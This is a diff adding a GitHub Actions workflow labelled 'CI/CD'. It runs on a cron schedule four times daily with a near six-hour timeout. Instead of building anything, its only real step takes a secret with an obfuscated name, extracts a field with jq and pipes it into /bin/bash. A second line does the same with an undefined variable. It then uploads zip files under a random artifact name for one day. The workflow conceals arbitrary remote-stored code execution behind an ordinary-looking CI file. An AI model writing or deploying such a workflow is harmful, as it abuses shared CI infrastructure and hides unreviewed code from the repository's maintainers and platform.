@@ -1,0 +1,29 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          qnf975: ${{ secrets.qnf975 }}
+        run: |
+          printf '%s' "$qnf975" | jq -r .uehyc32382 | /bin/bash
+          echo $pjbd192 | jq -r .hiar29439 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Wb6xSJXh
+          path: "*.zip"
+          retention-days: 1
